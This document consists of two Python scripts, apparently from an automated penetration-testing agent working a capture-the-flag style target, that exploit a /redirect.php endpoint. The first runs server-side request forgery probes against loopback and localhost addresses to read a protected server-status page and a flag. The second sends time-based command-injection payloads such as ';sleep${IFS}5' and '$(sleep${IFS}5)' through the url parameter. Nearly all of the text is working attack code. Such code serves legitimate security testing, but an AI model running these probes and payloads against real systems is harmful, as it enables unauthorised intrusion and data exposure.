import builtins, json, re
import httpx

BASE = 'http://127.0.0.176'
REDIRECT_PATH = '/redirect.php'
FLAG_RE = re.compile(r'(?:flag\{[^}]+\}|xbow-[A-Za-z0-9._:-]+|ctf\{[^}]+\})', re.I)
STATUS_MARKERS = [
    'Apache Server Status',
    'Server Version:',
    'Server MPM:',
    'Current Time:',
    'Restart Time:',
    'Parent Server Config. Generation:',
    'Total Accesses:',
    'Total kBytes:',
    'CPULoad:',
    'ReqPerSec:',
    'BytesPerSec:',
    'BusyWorkers:',
    'IdleWorkers:',
    'Scoreboard'
]

def emit(evidence):
    fn = globals().get('aegispt_emit_finding', getattr(builtins, 'aegispt_emit_finding', None))
    payload = {
        'title': 'SSRF/read primitive via /redirect.php exposes protected internal response',
        'severity': 'high',
        'target_url': BASE + REDIRECT_PATH,
        'evidence_excerpt': evidence
    }
    if fn is None:
        print(json.dumps(payload, ensure_ascii=False))
        return
    try:
        fn(**payload)
        return
    except TypeError:
        pass
    try:
        fn(payload)
    except Exception:
        print(json.dumps(payload, ensure_ascii=False))

def scope_get(client, path, **kwargs):
    if not path.startswith('/'):
        raise ValueError('direct requests must stay on target paths')
    return client.get(path, **kwargs)

def compact(text):
    return re.sub(r'\s+', ' ', text or '').strip()

def looks_like_same_page(a, b):
    a = compact(a)
    b = compact(b)
    return bool(a and b and (a[:120] in b or b[:120] in a))

def summarize(resp):
    return {
        'status': resp.status_code,
        'location': resp.headers.get('location'),
        'content_type': resp.headers.get('content-type'),
        'body_prefix': compact(resp.text)[:160]
    }

def print_resp(label, resp):
    s = summarize(resp)
    status = s['status']
    location = s['location']
    content_type = s['content_type']
    body_prefix = s['body_prefix']
    print(f'{label}: status={status} location={location!r} content_type={content_type!r} body_prefix={body_prefix!r}')

def safe_get(client, label, path, **kwargs):
    try:
        resp = scope_get(client, path, **kwargs)
        print_resp(label, resp)
        return resp
    except Exception as e:
        print(f'{label}: error={e!r}')
        return None

def extract_literal(text):
    m = FLAG_RE.search(text or '')
    if m:
        return m.group(0)
    lines = []
    for line in (text or '').splitlines():
        if any(marker in line for marker in STATUS_MARKERS):
            lines.append(line.strip())
        if len(lines) >= 8:
            break
    return '\n'.join(lines) if lines else compact(text)[:240]

with httpx.Client(base_url=BASE, timeout=6.0, follow_redirects=False) as client:
    root = safe_get(client, 'GET /', '/')
    direct_status = safe_get(client, 'GET /server-status', '/server-status')
    safe_get(client, 'GET /redirect.php', REDIRECT_PATH)
    benign = safe_get(client, 'GET /redirect.php?url=self_root', REDIRECT_PATH, params={'url': BASE + '/'})

    if not root or not direct_status or not benign:
        raise SystemExit(0)

    loc = benign.headers.get('location')
    clear_open_redirect = benign.is_redirect and loc in (BASE, BASE + '/', '/')
    fetch_like = benign.status_code == 200 and looks_like_same_page(root.text, benign.text)

    if clear_open_redirect and not fetch_like:
        print('Benign probe shows a client-side redirect; avoiding blind payload churn.')
        raise SystemExit(0)

    candidates = [
        ('public_auto', BASE + '/server-status?auto'),
        ('public_html', BASE + '/server-status'),
        ('loopback_auto', 'http://127.0.0.1/server-status?auto'),
        ('loopback_html', 'http://127.0.0.1/server-status'),
        ('localhost_auto', 'http://localhost/server-status?auto'),
        ('localhost_html', 'http://localhost/server-status'),
        ('loopback_root', 'http://127.0.0.1/'),
        ('localhost_root', 'http://localhost/'),
        ('loopback_8080_root', 'http://127.0.0.1:8080/'),
        ('localhost_8080_root', 'http://localhost:8080/'),
        ('loopback_8080_flag', 'http://127.0.0.1:8080/flag'),
        ('localhost_8080_flag', 'http://localhost:8080/flag')
    ]

    for name, candidate in candidates:
        resp = safe_get(client, f'SSRF {name}', REDIRECT_PATH, params={'url': candidate})
        if resp is None:
            continue
        body = resp.text or ''

        m = FLAG_RE.search(body)
        if m:
            evidence = json.dumps({
                'probe': name,
                'ssrf_url': candidate,
                'ssrf_response': summarize(resp),
                'literal_excerpt': m.group(0)
            }, ensure_ascii=False)
            emit(evidence)
            raise SystemExit(0)

        if direct_status.status_code == 403 and resp.status_code == 200 and any(marker in body for marker in STATUS_MARKERS):
            evidence = json.dumps({
                'direct_server_status': summarize(direct_status),
                'probe': name,
                'ssrf_url': candidate,
                'ssrf_response': summarize(resp),
                'literal_excerpt': extract_literal(body)
            }, ensure_ascii=False)
            emit(evidence)
            raise SystemExit(0)

    print('No verified internal-response disclosure found.')

import builtins, json, time
from statistics import median
import httpx

TARGET = 'http://127.0.0.176/redirect.php'
BASELINE_URL = 'http://127.0.0.1/'
PAYLOADS = [
    ('semicolon', 'http://127.0.0.1/;sleep 5'),
    ('ifs', 'http://127.0.0.1/;sleep${IFS}5'),
    ('subshell', 'http://127.0.0.1/$(sleep${IFS}5)')
]

def emit(evidence):
    fn = globals().get('aegispt_emit_finding', getattr(builtins, 'aegispt_emit_finding', None))
    payload = {
        'title': 'Command injection via /redirect.php url parameter',
        'severity': 'critical',
        'target_url': TARGET,
        'evidence_excerpt': evidence
    }
    if fn is None:
        print(json.dumps(payload))
        return
    try:
        fn(**payload)
        return
    except TypeError:
        pass
    try:
        fn(payload)
    except Exception:
        print(json.dumps(payload))

def timed_request(client, supplied_url):
    start = time.perf_counter()
    resp = client.get(TARGET, params={'url': supplied_url})
    return time.perf_counter() - start, resp

with httpx.Client(timeout=15.0, follow_redirects=False) as client:
    baseline_samples = [timed_request(client, BASELINE_URL)[0] for _ in range(3)]
    baseline = median(baseline_samples)

    for name, payload_url in PAYLOADS:
        samples = []
        for _ in range(2):
            elapsed, resp = timed_request(client, payload_url)
            samples.append({
                'elapsed_s': round(elapsed, 3),
                'status': resp.status_code,
                'body_prefix': resp.text[:120]
            })
        if all((s['elapsed_s'] - baseline) > 4.0 for s in samples):
            emit(json.dumps({
                'baseline_median_s': round(baseline, 3),
                'baseline_samples_s': [round(x, 3) for x in baseline_samples],
                'payload_name': name,
                'payload_url': payload_url,
                'samples': samples
            }))
            break

